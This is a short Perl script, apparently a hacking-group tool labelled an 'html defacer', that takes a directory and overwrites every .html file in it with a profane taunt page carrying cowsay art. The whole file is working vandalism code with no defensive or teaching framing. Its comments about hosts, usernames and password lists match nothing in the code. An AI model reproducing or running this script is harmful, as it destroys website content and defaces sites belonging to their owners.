# html defacer written by ArkAngeL43
use Getopt::Std;
# check if the hosts port is open


my %opts = (
);

# h = Host address 
# u = UserName 
# p = Port
# l = password list 
# f = file for save passwords
getopt('f:', \%opts);



$def = '
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <p>
  ______________
< fuck your HTML >
  --------------
         \   ^__^ 
          \  (oo)\_______
             (__)\       )\/\
                 ||----w |
                 ||     ||
      
      HEHEHEHE LULZ, Gotta love the cow 
      Get fucked by literal fucking perl, a lang from the 80s XD

      S_C_A_R_E | S_E_C_U_R_I_T_Y 

      Copywrite -> FUCK YOU YOU FUCKING BASTARDS!!!!!!
    </p>
</body>
</html>
'; 

$filepath = $opts{f};

# parse the filepath with the major * or < all > tag
my $main_filepath = $filepath . "/*.html";
print "Walking... -> $main_filepath";

print "[+]DEFACING...\n"; 
print"[+]DEFACING ALL .html FILES IN DIRECTORY\n"; 
my @html = glob($main_filepath); #Files 
foreach my $deface(@html) {
   print "[+] HIT      -> $deface\n";
   print "[+] Defacing -> $deface\n"; 
   open(DEFACE, '>', $deface); 
   print DEFACE $def || print "[-]Fucked up $!\n"; 
   close(DEFACE) 
}        
 